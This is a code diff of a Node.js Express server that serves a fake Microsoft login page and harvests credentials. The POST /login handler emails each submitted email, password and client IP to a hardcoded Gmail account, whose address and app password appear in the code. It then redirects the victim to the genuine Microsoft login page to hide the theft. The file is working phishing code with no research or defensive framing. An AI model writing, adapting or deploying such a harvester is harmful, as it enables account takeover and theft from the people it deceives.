@@ -1,44 +1,49 @@
 const express = require('express');
-const nodemailer = require('nodemailer');
 const path = require('path');
-
+const nodemailer = require('nodemailer');
 const app = express();
-const PORT = process.env.PORT || 8080;
 
-app.set('trust proxy', true);
-app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: 'emmanuelkefas0101@gmail.com',
-        pass: 'Ewcm qhom pddx ryni'
-    }
+// Serve the Microsoft login page at the root URL
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.post('/api/login', async (req, res) => {
+// Handle login submission, send email alert, and redirect immediately
+app.post('/login', async (req, res) => {
     const { email, password } = req.body;
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    const transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+            user: 'emmanuelkefas0101@gmail.com',
+            pass: 'Ewcm qhom pddx ryni'
+        }
+    });
 
     const mailOptions = {
         from: 'emmanuelkefas0101@gmail.com',
         to: 'emmanuelkefas0101@gmail.com',
-        subject: 'New Microsoft Login Captured',
-        text: `New credentials captured:\n\nEmail: ${email}\nPassword: ${password}\nClient IP: ${clientIp}\nTime: ${new Date().toLocaleString()}`
+        subject: 'New Microsoft Login Capture',
+        text: `Captured Credentials:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${clientIp}`
     };
 
     try {
         await transporter.sendMail(mailOptions);
-        console.log('Login details emailed successfully');
-        res.status(200).json({ success: true });
     } catch (error) {
         console.error('Error sending email:', error);
-        res.status(500).json({ success: false, error: error.message });
     }
+
+    // Immediately redirect user to official Microsoft login page
+    res.redirect('https://login.microsoftonline.com');
 });
 
-app.listen(PORT, '0.0.0.0', () => {
+const PORT = process.env.PORT || 8080;
+app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
+
